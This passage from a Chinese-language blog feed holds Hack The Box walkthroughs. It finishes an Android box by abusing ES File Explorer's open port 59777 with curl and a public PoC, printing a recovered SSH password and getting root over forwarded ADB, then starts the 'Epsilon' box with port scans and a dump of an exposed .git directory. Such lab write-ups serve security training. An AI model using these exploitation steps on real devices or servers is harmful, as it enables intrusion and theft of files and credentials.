class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;582.00 Bytes (582 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;29.00 KB (29,697 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.environ.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;1.04 KB (1,064 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.android_x86_64.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;3.36 KB (3,439 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;2.29 MB (2,401,264 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;fstab.android_x86_64&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;753.00 Bytes (753 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;etc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/25/20 03:41:52 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:05 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;2.64 KB (2,700 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;default.prop&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;1.09 KB (1,118 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/15/21 04:49:09 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:02 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:04 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;charger&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;12/31/69 07:00:00 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cache&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:04 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;120.00 Bytes (120 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;bugreports&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;12/31/69 07:00:00 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/25/20 12:26:22 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;8.00 KB (8,192 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;acct&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;<br>]   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">listFiles：列出所有<br><br>文件listPics：列出所有图片listVideos：列出所有视频<br><br>listAudios：列出所有音频文件<br><br>listApps：列出所有已安装的应用<br><br>listAppsSystem：列出所有系统应用<br><br>listAppsPhone：列出所有手机应用<br><br>listAppsSdcard：列出所有sdcard中的apk文件<br><br>listAppsAll：列出安装的所有应用程序（包括系统应用程序）<br><br>getDeviceInfo：获取设备信息<br><br>appPull：从设备中提取应用程序。需要包名称参数<br><br>appLaunch：启动应用程序。需要包名称参数<br><br>getAppThumbnail：获取应用程序的图标。包名称参数是必需的<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl 10.10.10.247:59777 -d <span class="hljs-string">&#x27;&#123;&quot;command&quot;: &quot;listPics&quot;&#125;&#x27;</span><br>[<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;concept.jpg&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;4/21/21 02:38:08 AM&quot;</span>, <span class="hljs-string">&quot;location&quot;</span>:<span class="hljs-string">&quot;/storage/emulated/0/DCIM/concept.jpg&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;135.33 KB (138,573 Bytes)&quot;</span>, &#125;,<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;anc.png&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;4/21/21 02:37:50 AM&quot;</span>, <span class="hljs-string">&quot;location&quot;</span>:<span class="hljs-string">&quot;/storage/emulated/0/DCIM/anc.png&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;6.24 KB (6,392 Bytes)&quot;</span>, &#125;,<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;creds.jpg&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;4/21/21 02:38:18 AM&quot;</span>, <span class="hljs-string">&quot;location&quot;</span>:<span class="hljs-string">&quot;/storage/emulated/0/DCIM/creds.jpg&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;1.14 MB (1,200,401 Bytes)&quot;</span>, &#125;,<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;224_anc.png&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;4/21/21 02:37:21 AM&quot;</span>, <span class="hljs-string">&quot;location&quot;</span>:<span class="hljs-string">&quot;/storage/emulated/0/DCIM/224_anc.png&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;124.88 KB (127,876 Bytes)&quot;</span>, &#125;,<br>]                   <br></code></pre></td></tr></table></figure><p>在Github有一个漏洞POC，可以很便捷的获取目标的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; python poc.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247<br>[*] Getting file: /storage/emulated/0/DCIM/creds.jpg<br>from: 10.10.10.247<br>[*] Server responded with: 200<br>[*] Writing to file: creds.jpg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518093814982.png" alt="image-20220518093814982"></p><p>kristi:Kr1sT!5h@Rp3xPl0r3!</p><p>链接时可能会提示host key type found。在&#x2F;etc&#x2F;ssh&#x2F;ssh_config添加如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Host 10.10.10.247<br>    HostkeyAlgorithms +ssh-rsa<br>    PubkeyAcceptedAlgorithms +ssh-rsa<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ssh kristi@10.10.10.247 -p 2222<br>The authenticity of host <span class="hljs-string">&#x27;[10.10.10.247]:2222 ([10.10.10.247]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.10.247]:2222<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">Password authentication</span><br><span class="hljs-string">(kristi@10.10.10.247) Password: </span><br><span class="hljs-string">:/ $ sudo -l</span><br><span class="hljs-string">/system/bin/sh: sudo: not found</span><br><span class="hljs-string">127|:/ $ cd /storage/emulated/0/</span><br><span class="hljs-string">:/storage/emulated/0 $ ls</span><br><span class="hljs-string">Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt </span><br><span class="hljs-string">Android Download Music  Pictures      Ringtones dianxinos </span><br><span class="hljs-string">:/storage/emulated/0 $ cat user.txt                                            </span><br><span class="hljs-string">f3................................</span><br></code></pre></td></tr></table></figure><p>作者遗留了个5555调试端口，无法从外部直接链接，可以将端口转发到本地，按shift + ~ +C ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">:/storage/emulated/0/Download $ <br>ssh&gt; -L 5555:localhost:5555<br>Forwarding port.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo apt install adb<br>&gt;&gt; adb connect localhost:5555<br>connected to localhost:5555<br>&gt;&gt; adb devices               <br>List of devices attached<br>localhost:5555device<br>&gt;&gt; adb shell  <br>x86_64:/ $ <span class="hljs-built_in">ls</span>                                                                                                                                                 <br>acct       default.prop           init.superuser.rc    oem                     sbin                      vendor                    <br>bin        dev                    init.usb.configfs.rc plat_file_contexts      sdcard                    vendor_file_contexts      <br>bugreports etc                    init.usb.rc          plat_hwservice_contexts sepolicy                  vendor_hwservice_contexts <br>cache      fstab.android_x86_64   init.zygote32.rc     plat_property_contexts  storage                   vendor_property_contexts  <br>charger    init                   init.zygote64_32.rc  plat_seapp_contexts     sys                       vendor_seapp_contexts     <br>config     init.android_x86_64.rc lib                  plat_service_contexts   system                    vendor_service_contexts   <br>d          init.environ.rc        mnt                  proc                    ueventd.android_x86_64.rc vndservice_contexts       <br>data       init.rc                odm                  product                 ueventd.rc                <br>x86_64:/ $ su<br>:/ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root) context=u:r:su:s0<br>:/ <span class="hljs-comment"># find / -name root.txt 2&gt;/dev/null</span><br>/data/root.txt<br>1|:/ <span class="hljs-comment"># cat /data/root.txt                                                      </span><br>f...........................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Epsilon</title>
    <link href="/post/HackTheBox-Epsilon.html"/>
    <url>/post/HackTheBox-Epsilon.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Epsilon.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.134<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-23 00:12:43 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 5000/tcp on 10.10.11.134                                  <br>Discovered open port 80/tcp on 10.10.11.134                                    <br>Discovered open port 22/tcp on 10.10.11.134        <br>Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.11.134 -p5000,80,22 -oN Epsilon    <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-23 08:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.134<br>Host is up (0.13s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)<br>|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)<br>|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41<br>|_http-title: 403 Forbidden<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>| http-git: <br>|   10.10.11.134:80/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit message: Updating Tracking API  <span class="hljs-comment"># Please enter the commit message for...</span><br>5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)<br>|_http-title: Costume Shop<br>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.56 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.134 -p5000,80,22 -oN Epsilon<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ gitdumper http://10.10.11.134/.git/ . <br><span class="hljs-comment">###########</span><br><span class="hljs-comment"># GitDumper is part of https://github.com/internetwache/GitTools</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Developed and maintained by @gehaxelt from @internetwache</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span><br><span class="hljs-comment"># Only for educational purposes!</span><br><span class="hljs-comment">###########</span><br><br><br>[*] Destination folder does not exist<br>[+] Creating ./.git/<br>[+] Downloaded: HEAD<br>[-] Downloaded: objects/info/packs<br>[+] Downloaded: description<br>[+] Downloaded: config<br>[+] Downloaded: COMMIT_EDITMSG<br>[+] Downloaded: index<br>[-] Downloaded: packed-refs<br>[+] Downloaded: refs/heads/master<br>[-] Downloaded: refs/remotes/origin/HEAD<br>[-] Downloaded: refs/stash<br>[+] Downloaded: logs/HEAD<br>[+] Downloaded: logs/refs/heads/master<br>[-] Downloaded: logs/refs/remotes/origin/HEAD<br>[-] Downloaded: info/refs<br>[+] Downloaded: info/exclude<br>[-] Downloaded: /refs/wip/index/refs/heads/master<br>[-] Downloaded: /refs/wip/wtree/refs/heads/master<br>[+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91<br>[-] Downloaded: objects/00/00000000000000000000000000000000000000<br>[+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3<br>[+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1<br>[+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d<br>[+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0<br>[+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02<br>[+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010<br>[+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca<br>[+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8<br>[+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d<br>[+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e<br>[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630<br>[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca<br>[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/.git$ <span class="hljs-built_in">cat</span> refs/heads/master         <br>c622771686bd74c16ece91193d29f85b5f9ffa91<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000000000000000000000000000000000 7cf92a7a09e523c1c667d13847c9ba22464412f3 root &lt;root@epsilon.htb&gt; 1637143228 +0000commit (initial): Adding Tracking API Module<br>7cf92a7a09e523c1c667d13847c9ba22464412f3 c51441640fd25e9fba42725147595b5918eba0f1 root &lt;root@epsilon.htb&gt; 1637143258 +0000commit: Updatig Tracking API<br>c51441640fd25e9fba42725147595b5918eba0f1 b10dd06d56ac760efbbb5d254ea43bf9beb56d2d root &lt;root@epsilon.htb&gt; 1637143379 +0000commit: Adding Costume Site<br>b10dd06d56ac760efbbb5d254ea43bf9beb56d2d c622771686bd74c16ece91193d29f85b5f9ffa91 root &lt;root@epsilon.htb&gt; 1637170867 +0000commit: Fixed Typo<br>c622771686bd74c16ece91193d29f85b5f9ffa91 c51441640fd25e9fba42725147595b5918eba0f1 root &lt;root@epsilon.htb&gt; 1637170885 +0000checkout: moving from master to c51441640fd25e9fba42725147595b5918eba0f1<br>c51441640fd25e9fba42725147595b5918eba0f1 ce401ccecf421ff19bf43fafe8a60a0d0f0682d0 root &lt;root@epsilon.htb&gt; 1637170905 +0000commit (amend): Updating Tracking API<br>ce401ccecf421ff19bf43fafe8a60a0d0f0682d0 c622771686bd74c16ece91193d29f85b5f9ffa91 root &lt;root@epsilon.htb&gt; 1637170925 +0000checkout: moving from ce401ccecf421ff19bf43fafe8a60a0d0f0682d0 to master<br>c622771686bd74c16ece91193d29f85b5f9ffa91 c51441640fd25e9fba42725147595b5918eba0f1 root &lt;root@epsilon.htb&gt; 1637171059 +0000checkout: moving from master to c51441640fd25e9fba42725147595b5918eba0f1<br>c51441640fd25e9fba42725147595b5918eba0f1 5c52105750831385d4756111e1103957ac599d02 root &lt;root@epsilon.htb&gt; 1637171073 +0000commit (amend): Updating Tracking API<br>5c52105750831385d4756111e1103957ac599d02 c622771686bd74c16ece91193d29f85b5f9ffa91 root &lt;root@epsilon.htb&gt; 1637171146 +0000checkout: moving from 5c52105750831385d4756111e1103957ac599d02 to master<br>c622771686bd74c16ece91193d29f85b5f9ffa91 c622771686bd74c16ece91193d29f85b5f9ffa91 root &lt;root@epsilon.htb&gt; 1637171218 +0000rebase -i (start): checkout HEAD~3<br>c622771686bd74c16ece91193d29f85b5f9ffa91 c622771686bd74c16ece91193d29f85b5f9ffa91 root &lt;root@epsilon.htb&gt; 1637171218 +0000rebase -i (finish): returning to refs/heads/master<br></code></pre></td></tr></table></figure><p>暂时不知道有什么用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ dirsearch -u http://10.10.11.134/     <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.11.134/-_22-08-23_08-25-04.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-23_08-25-04.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.11.134/<br><br>[08:25:04] Starting: <br>[08:25:10] 403 -  277B  - /.git/<br>[08:25:10] 200 -  296B  - /.git/COMMIT_EDITMSG<br>[08:25:10] 200 -   92B  - /.git/config<br>[08:25:10] 403 -  277B  - /.git/branches/<br>[08:25:10] 200 -   23B  - /.git/HEAD<br>[08:25:10] 200 -   73B  - /.git/description<br>[08:25:10] 403 -  277B  - /.git/hooks/<br>[08:25:10] 301 -  311B  - /.git  -&gt;  http://10.10.11.134/.git/<br>[08:25:10] 403 -  277B  - /.git/info/<br>[08:25:10] 200 -  225B  - /.git/index<br>[08:25:10] 200 -  613B  - /.git/logs/refs/heads/master<br>[08:25:10] 403 -  277B  - /.git/logs/<br>[08:25:10] 200 -    2KB - /.git/logs/HEAD<br>[08:25:10] 301 -  327B  - /.git/logs/refs/heads  -&gt;  http://10.10.11.134/.git/logs/refs/heads/<br>[08:25:10] 200 -  240B  - /.git/info/exclude<br>[08:25:10] 301 -  321B  - /.git/logs/refs  -&gt;  http://10.10.11.134/.git/logs/refs/<br>[08:25:10] 301 -  322B  - /.git/refs/heads  -&gt;  